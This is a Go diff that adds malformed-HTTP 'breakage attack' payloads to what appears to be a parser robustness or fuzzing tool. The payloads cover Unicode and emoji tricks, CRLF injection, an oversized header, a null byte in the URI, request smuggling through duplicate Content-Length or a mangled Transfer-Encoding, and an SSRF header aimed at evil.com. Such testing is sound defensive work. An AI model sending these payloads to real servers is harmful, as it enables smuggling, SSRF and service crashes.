@@ -1336,5 +1336,157 @@ func allBreakageAttacks(_ string) []breakageAttack {
 			},
 		},
 
+		// ===== EMOJI & UNICODE ATTACKS =====
+		{
+			name: "emoji_in_method", category: "unicode",
+			description: "Emoji characters as HTTP method (crashes ASCII-only parsers)",
+			payload: func(host string) []byte {
+				return []byte("\xF0\x9F\x94\xA5 / HTTP/1.1\r\nHost: " + host + "\r\n\r\n") // 🔥 as method
+			},
+		},
+		{
+			name: "emoji_in_uri", category: "unicode",
+			description: "Emoji in URI path (non-percent-encoded)",
+			payload: func(host string) []byte {
+				return []byte("GET /\xF0\x9F\x92\xA9/path HTTP/1.1\r\nHost: " + host + "\r\n\r\n") // 💩 in path
+			},
+		},
+		{
+			name: "emoji_in_host", category: "unicode",
+			description: "Emoji in Host header value",
+			payload: func(host string) []byte {
+				return []byte("GET / HTTP/1.1\r\nHost: \xF0\x9F\x8C\x90." + host + "\r\n\r\n") // 🌐 prefix
+			},
+		},
+		{
+			name: "emoji_in_header_name", category: "unicode",
+			description: "Emoji as header name (completely illegal)",
+			payload: func(host string) []byte {
+				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\n\xF0\x9F\x94\xA5: fire\r\n\r\n")
+			},
+		},
+		{
+			name: "emoji_in_header_value", category: "unicode",
+			description: "Emoji in header value",
+			payload: func(host string) []byte {
+				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Emoji: \xF0\x9F\x98\x88\xF0\x9F\x91\xBB\xF0\x9F\x92\xA3\r\n\r\n")
+			},
+		},
+		{
+			name: "zalgo_header", category: "unicode",
+			description: "Zalgo combining diacritics in header value (renders corruption)",
+			payload: func(host string) []byte {
+				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Zalgo: h\xcc\xa8\xcc\xa9\xcc\xaee\xcc\xa8\xcc\xa9l\xcc\xa8p\r\n\r\n")
+			},
+		},
+		{
+			name: "rtl_override_header", category: "unicode",
+			description: "Right-to-left override in header (confuses log parsers)",
+			payload: func(host string) []byte {
+				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-RTL: normal\xe2\x80\xaedesrever\r\n\r\n") // U+202E RLO
+			},
+		},
+		{
+			name: "zero_width_in_method", category: "unicode",
+			description: "Zero-width spaces inside HTTP method",
+			payload: func(host string) []byte {
+				return []byte("G\xe2\x80\x8bE\xe2\x80\x8bT / HTTP/1.1\r\nHost: " + host + "\r\n\r\n") // ZWS between letters
+			},
+		},
+		{
+			name: "overlong_utf8_slash", category: "unicode",
+			description: "Overlong UTF-8 encoding of / (security bypass pattern)",
+			payload: func(host string) []byte {
+				return []byte("GET \xc0\xaf HTTP/1.1\r\nHost: " + host + "\r\n\r\n") // Overlong /
+			},
+		},
+		{
+			name: "ansi_escape_in_header", category: "unicode",
+			description: "ANSI escape sequences in header (crashes terminal log viewers)",
+			payload: func(host string) []byte {
+				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Color: \x1b[31mRED\x1b[0m\r\nX-Bell: \x07\x07\r\n\r\n")
+			},
+		},
+		{
+			name: "latin1_in_utf8_host", category: "unicode",
+			description: "Latin-1 high bytes in Host header (encoding confusion)",
+			payload: func(host string) []byte {
+				return []byte("GET / HTTP/1.1\r\nHost: caf\xe9." + host + "\r\n\r\n") // café with Latin-1 é
+			},
+		},
+		{
+			name: "fullwidth_method", category: "unicode",
+			description: "Fullwidth ASCII characters as HTTP method (looks like GET but isn't)",
+			payload: func(host string) []byte {
+				return []byte("\xef\xbc\xa7\xef\xbc\xa5\xef\xbc\xb4 / HTTP/1.1\r\nHost: " + host + "\r\n\r\n") // ＧＥＴ
+			},
+		},
+		{
+			name: "homoglyph_host", category: "unicode",
+			description: "Cyrillic homoglyphs in Host header (а looks like a)",
+			payload: func(host string) []byte {
+				// Replace 'a' with Cyrillic 'а' (U+0430) in host
+				return []byte("GET / HTTP/1.1\r\nHost: \xd0\xb0\xd1\x80\xd1\x80le.com\r\n\r\n") // аррle.com
+			},
+		},
+		{
+			name: "mixed_line_endings_unicode", category: "unicode",
+			description: "Unicode line separator (LS) and paragraph separator (PS) as line endings",
+			payload: func(host string) []byte {
+				// U+2028 Line Separator, U+2029 Paragraph Separator
+				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\xe2\x80\xa8X-After-LS: val\r\n\r\n")
+			},
+		},
+		// --- CVE-INSPIRED ATTACKS ---
+		{
+			name: "crlf_injection_location", category: "cve",
+			description: "CRLF injection in header value (CVE-2019-9740 pattern)",
+			payload: func(host string) []byte {
+				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Inject: val\r\nInjected: yes\r\n\r\n")
+			},
+		},
+		{
+			name: "giant_header_value", category: "cve",
+			description: "65KB header value to trigger buffer overflow or allocation crash",
+			payload: func(host string) []byte {
+				bigVal := strings.Repeat("A", 65536)
+				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Big: " + bigVal + "\r\n\r\n")
+			},
+		},
+		{
+			name: "null_in_uri", category: "cve",
+			description: "Null byte in URI path (CVE-2013-4547 pattern)",
+			payload: func(host string) []byte {
+				return []byte("GET /admin\x00.html HTTP/1.1\r\nHost: " + host + "\r\n\r\n")
+			},
+		},
+		{
+			name: "space_in_header_name", category: "cve",
+			description: "Whitespace in header name (RFC violation, crashes strict parsers)",
+			payload: func(host string) []byte {
+				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX Bad Name: value\r\n\r\n")
+			},
+		},
+		{
+			name: "duplicate_content_length", category: "cve",
+			description: "Duplicate Content-Length headers (request smuggling)",
+			payload: func(host string) []byte {
+				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nContent-Length: 5\r\nContent-Length: 0\r\n\r\nhello")
+			},
+		},
+		{
+			name: "chunked_unicode_te", category: "cve",
+			description: "Transfer-Encoding with overlong UTF-8 (smuggling bypass)",
+			payload: func(host string) []byte {
+				return []byte("POST / HTTP/1.1\r\nHost: " + host + "\r\nTransfer-Encoding: chunked\xc0\xae\r\n\r\n0\r\n\r\n")
+			},
+		},
+		{
+			name: "ssrf_forwarded_host", category: "cve",
+			description: "X-Forwarded-Host with @ for SSRF (CVE-2021-40438 pattern)",
+			payload: func(host string) []byte {
+				return []byte("GET / HTTP/1.1\r\nHost: " + host + "\r\nX-Forwarded-Host: evil.com:@internal:8080\r\n\r\n")
+			},
+		},
 	}
 }
